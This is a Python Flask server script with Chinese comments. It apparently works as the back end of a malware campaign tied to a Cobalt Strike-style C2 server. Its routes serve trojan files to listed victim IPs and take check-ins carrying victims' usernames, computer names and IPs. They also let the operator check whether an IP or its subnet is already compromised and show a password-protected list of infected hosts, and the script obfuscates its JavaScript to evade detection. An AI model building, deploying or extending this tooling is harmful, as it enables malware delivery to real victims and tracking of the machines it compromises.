#! user/bin/env python3
# coding: utf-8
import os
import time
import json
from setting import *
from flask import Flask, render_template, request, make_response, send_from_directory
from lib.util import read_file_to_list_de_weight, file_is_exist, replace_templates, js_obfuscate_m1, js_obfuscate_m2, mkdir, touch_file, get_var_name, list_in_str

# 可选启动 gevent,提高 服务器性能
# python flask文件下载  https://blog.csdn.net/zhiweihongyan1/article/details/120921334
from gevent.pywsgi import WSGIServer
from gevent import monkey
monkey.patch_all() # 将python标准的io方法，都替换成gevent中的同名方法，遇到io阻塞gevent自动进行协程切换

# app = Flask(__name__)
app = Flask(__name__,
            static_url_path="/static",  # 指定静态文件 url前缀
            static_folder="static",  # 指定静态文件目录
            template_folder="templates"  # 指定模板文件目录
            )

# 绝对路径变量
initialize_start_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
print(f"[+] 初始化参数配置开始...{initialize_start_time}")

root_path = app.root_path  # 网站绝对路径
module_path = os.path.join(root_path, "module")  # 模板文件路径
static_path = os.path.join(root_path, "static")  # 静态文件路径
download_dir = os.path.join(root_path, "download")   # 木马文件存储目录
# 如果文件夹不存在就创建文件夹
mkdir(module_path)
mkdir(static_path)
mkdir(download_dir)

# 记录上线结果文件
record_path = os.path.join(root_path, record_name)
touch_file(record_path)

# 动态生成新的静态文件,主要是替换静态文件中的【HOST等】变量
replace_dict = dict()
for variable in replace_list:
    replace_dict["{{"+get_var_name(variable)+"}}"] = variable
print(f"[*] 生成变量替换字典: replace_dict:{replace_dict}")
replace_templates(src_dir_path=module_path, dst_dir_path=static_path, ext=".templates", replace_dict=replace_dict)

if js_obfuscate_method == 0:
    pass
elif js_obfuscate_method == 1:
    # 解决警告信息问题
    if not file_is_exist(record_path):
        print(f"[*] 首次运行本加密脚本, 需要删除临时代码文件,解决警告信息问题...")
        lex_tab_path = os.path.join(root_path, "lib", "slimit", "lextab.py")
        yacc_tab_path = os.path.join(root_path, "lib", "slimit", "yacctab.py")
        if file_is_exist(lex_tab_path): os.remove(lex_tab_path)
        if file_is_exist(yacc_tab_path): os.remove(yacc_tab_path)
    js_obfuscate_m1(js_code_dir=static_path)  # 启动时间长
elif js_obfuscate_method == 2:
    js_obfuscate_m2(js_code_dir=static_path)  # 存在弹框时中文乱码信息

initialize_end_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
print(f"[+] 初始化参数配置完毕...{initialize_end_time}")

# @app.route('/')
# def hello_world():
#     return 'Hello World!'
#
#
# @app.route('/myip')
# def get_client_ip():
#     client_ip = request.remote_addr
#     return render_template('myip.html', client_ip=client_ip)

# 请求url: http://18.92.**.113:****/api/hrm_home/all?category=test
# 各个方法返回结果:
# request.path: /api/hrm_home/all
# request.host: 18.92.**.113:****
# request.host_url: http://18.92.**.113:****/
# request.full_path: /api/hrm_home/all?category=test
# request.script_root:
# request.url: http://18.92.**.113:****/api/hrm_home/all?category=test
# request.base_url: http://18.92.**.113:****/api/hrm_home/all
# request.url_root: http://18.92.**.113:****/

@app.route('/')
@app.route('/test')
def get_client_ip():
    # flask 获取客户端IP https://www.jb51.net/article/62608.htm
    full_url = request.url
    client_ip = request.remote_addr
    print(f"[*] 发现测试页面访问请求: 来源 Client IP:{client_ip} 请求地址: {full_url}")
    return render_template('test.html', time=time.time())

# 判断IP是否已经上线
@app.route('/exist')
def ip_exist():

    full_url = request.url
    client_ip = request.remote_addr
    print(f"[*] 发现查询页面访问请求: 来源 Client IP:{client_ip} 请求地址: {full_url}")

    try:
        if "ip" in request.args:
            client_ip = request.args.get("ip")
            print(f"[*] 发现查询请求: 查询 目标IP:{client_ip} 请求地址: {request.full_path}")

        # 读取数据库文件,每一行是一个Json文件
        online_info_list = read_file_to_list_de_weight(record_path)
        # 初始化IP存在标记
        ip_online_flag = False
        cip_online_flag = False

        if  online_info_list:
            all_online_info_dict = []

            for online_info_ in online_info_list:
                online_info_dict = json.loads(online_info_)
                all_online_info_dict.append(online_info_dict)

            # 获取所有外网IP
            all_online_ip_list = []
            for online_info_dict in all_online_info_dict:
                all_online_ip_list.append(online_info_dict[EXTERNAL_IP])
            all_online_ip_list = set(list(all_online_ip_list))

            # 获取所有外网IP C段
            all_online_cip_list = []
            for online_info_dict in all_online_info_dict:
                cip = online_info_dict[EXTERNAL_IP].rsplit(".",1)[0]
                all_online_cip_list.append(cip)
            all_online_cip_list = set(list(all_online_cip_list))

            # 判断IP是否存在上线IP列表
            if list_in_str(list_=all_online_ip_list, str_=client_ip, default=False):
                ip_online_flag = True

            # 判断IP是否存在于列表的C段中
            if list_in_str(list_=all_online_cip_list, str_=client_ip, default=False):
                cip_online_flag = True

        # 判断客户端浏览器是否存在于Cookie
        accessed_flag = request.cookies.get(ACCESSED_IP_EXIST_PAGE)
        # 返回 ip_online_flag 的值
        response = None
        # 肯定已经上线
        if ip_online_flag and accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} 已存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 已包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[肯定已经上线]...")
            response = make_response(HAS_IP_HAS_COOKIE)

        # 可能已经上线
        elif ip_online_flag and not accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} 已存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 不包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[可能已经上线]...")
            response = make_response(HAS_IP_NOT_COOKIE)

        # 大概已经上线
        elif cip_online_flag and accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} C段已存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 已包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[大概已经上线]...")
            response = make_response(HAS_CIP_HAS_COOKIE)

        # 大概没有上线
        elif cip_online_flag and not accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} C段已存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 不包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[大概已经上线]...")
            response = make_response(HAS_CIP_NOT_COOKIE)

        # 可能没有上线
        elif not ip_online_flag and accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} C段不存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 已包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[可能没有上线]...")
            response = make_response(NOT_IP_HAS_COOKIE)

        # 大概没有上线
        elif not cip_online_flag and accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} C段不存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 已包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[可能没有上线]...")
            response = make_response(NOT_CIP_HAS_COOKIE)

        # 大概没有上线
        elif not ip_online_flag and not accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} 不存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 不包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[大概没有上线]...")
            response = make_response(NOT_IP_NOT_COOKIE)
        # 肯定没有上线
        elif not cip_online_flag and not accessed_flag:
            print(f"[*] 来源 Client IP: {client_ip} C段不存在于上线数据库中...")
            print(f"[*] 来源 Client IP: {client_ip} 不包含Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag},判定为[肯定没有上线]...")
            response = make_response(NOT_CIP_NOT_COOKIE)
        else:
            print(f"[!] 未预测到的情景, 来源 Client IP: {client_ip}...")
            print(f"[!] 未预测到的情景, 来源 Cookie数据: {ACCESSED_IP_EXIST_PAGE}:{accessed_flag}...")
            return "BUG"

        # 更新Cookie标记
        if accessed_flag:
            response.set_cookie(ACCESSED_IP_EXIST_PAGE, str(int(accessed_flag) + 1), max_age=MAX_AGE)
        else:
            response.set_cookie(ACCESSED_IP_EXIST_PAGE, str(DEFAULT_VALUE), max_age=MAX_AGE)
        return response

    except Exception as error:
        print(f"[!] 查询 {client_ip} 上线记录时发生错误,请及时修复BUG...{str(error)}")
        return "BUG"


# 进行木马下载
@app.route("/download/<string:file_name>", methods=['GET', 'POST'])
def static_file(file_name):
    full_url = request.url
    client_ip = request.remote_addr
    print(f"[*] 发现下载页面访问请求: 来源 Client IP:{client_ip} 请求地址: {full_url}")

    # 判断客户端是否不拥有上线存储权限
    if not list_in_str(list_=VICTIM_SERVER_IP_LIST, str_=client_ip, default=True):
        print(f"[!] 客户端IP {client_ip} 没有下载木马文件权限...权限列表:{VICTIM_SERVER_IP_LIST}")
        return "PERMISSION DENIED"
    else:
        # 判断客户端浏览器是否存在于下载页面相关的Cookie
        downloaded_flag = request.cookies.get(ACCESSED_DOWNLOAD_PAGE)
        downloaded_file = request.cookies.get(ACCESSED_DOWNLOAD_FILE)

        # 返回下载文件
        # file_path = request.values.get("file_path") # 路由模式传参不需要
        response = make_response(send_from_directory(download_dir, file_name, as_attachment=True))
        response.headers["Content-Disposition"] = "attachment; filename={}".format(file_name.encode().decode('latin-1'))

        # 设置下载标记
        if downloaded_flag:
            print(f"[*] 客户端IP {client_ip} 已下载过木马文件: {downloaded_file}, 即将更新下载页面相关标记")
            response.set_cookie(ACCESSED_DOWNLOAD_PAGE, str(int(downloaded_flag) + 1), max_age=MAX_AGE)
            if file_name in downloaded_file:
                response.set_cookie(ACCESSED_DOWNLOAD_FILE, file_name, max_age=MAX_AGE)
            else:
                response.set_cookie(ACCESSED_DOWNLOAD_FILE, f"{downloaded_file},{file_name}", max_age=MAX_AGE)
        else:
            print(f"[*] 客户端IP {client_ip} 未下载过木马文件: {downloaded_file}, 即将创建下载页面相关标记")
            response.set_cookie(ACCESSED_DOWNLOAD_PAGE, str(DEFAULT_VALUE), max_age=MAX_AGE)
            response.set_cookie(ACCESSED_DOWNLOAD_FILE, file_name, max_age=MAX_AGE)
        return response


# 记录CS服务器传来的IP信息
# /store?action=store&internalIP=192.168.88.88&userName=hong66&computerName=hong66-pc&externalIP=88.88.88.88
@app.route('/store', methods=['GET', 'POST'])
def store_info():
    full_url = request.url
    client_ip = request.remote_addr
    print(f"[*] 发现存储页面访问请求: 来源 Client IP:{client_ip} 请求地址: {full_url}")

    # 判断客户端是否拥有上线存储权限
    if not list_in_str(list_=ATTACK_C2_SERVER_IP_LIST, str_=client_ip, default=True):
        print(f"[!] 客户端IP {client_ip} 没有存储上线记录权限...权限列表:{ATTACK_C2_SERVER_IP_LIST}")
        return "PERMISSION DENIED"
    else:
        print(f"[+] 客户端IP {client_ip} 拥有存储上线记录权限...")
        try:
            action = request.args.get("action")
            userName = request.args.get("userName")
            computerName = request.args.get("computerName")
            internalIP = request.args.get("internalIP")
            externalIP = request.args.get("externalIP")
            online_time = time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime())

            result_format = {ONLINE_TIME: f"{online_time}",
                             ACTION: f"{action}",
                             COMPUTER_NAME: f"{computerName}",
                             USER_NAME: f"{userName}",
                             EXTERNAL_IP: f"{externalIP}",
                             INTERNAL_IP: f"{internalIP}"}
            result_format = json.dumps(result_format)

            print(f"[+] 从CS服务器接收到上线提醒...{result_format}...")
            with open(record_path, 'a+', encoding="utf-8", errors="ignore") as f_open:
                f_open.write(f"{result_format}\n")

            # 预留其他动作支持
            if action: pass

            return "True"
        except Exception as error:
            print(f"[!] 存储上线记录时发生错误...{str(error)}")
            return "BUG"


@app.route('/online', methods=['GET', 'POST'])
def online_info():
    full_url = request.url
    client_ip = request.remote_addr
    print(f"[*] 发现记录页面访问请求: 来源 Client IP:{client_ip} 请求地址: {full_url}")

    # 判断客户端是否拥有访问上线记录的权限
    if not list_in_str(list_=ATTACK_CALL_SERVER_IP_LIST, str_=client_ip, default=True):
        print(f"[!] 客户端IP {client_ip} 没有访问上线记录权限...权限列表:{ATTACK_CALL_SERVER_IP_LIST}")
        return "PERMISSION DENIED"
    else:
        print(f"[!] 客户端IP {client_ip} 拥有访问上线记录权限...")
        if pwd == request.args.get("pwd"):
            print(f"[+] 客户端IP {client_ip} 发起请求 URL中密码参数匹配正确...即将返回所有上线数据...")
            record_list = read_file_to_list_de_weight(record_path)
            resp_html = render_template('online.html', record_list=record_list)
            resp = make_response(resp_html)
            resp.set_cookie(ACCESSED_ONLINE_PAGE, pwd, max_age=MAX_AGE)
        elif pwd == request.cookies.get(ACCESSED_ONLINE_PAGE):
            print(f"[+] 客户端IP {client_ip} 发起请求 Cookie密码参数匹配正确...即将返回所有上线数据...")
            record_list = read_file_to_list_de_weight(record_path)
            resp_html = render_template('online.html', record_list=record_list)
            resp = make_response(resp_html)
        else:
            resp = make_response('Hello World!')
    return resp


if __name__ == '__main__':
    # app.run("0.0.0.0", 80)
    # app.run( host="0.0.0.0", port=int("80") )
    WSGIServer(('0.0.0.0', 80), app).serve_forever()
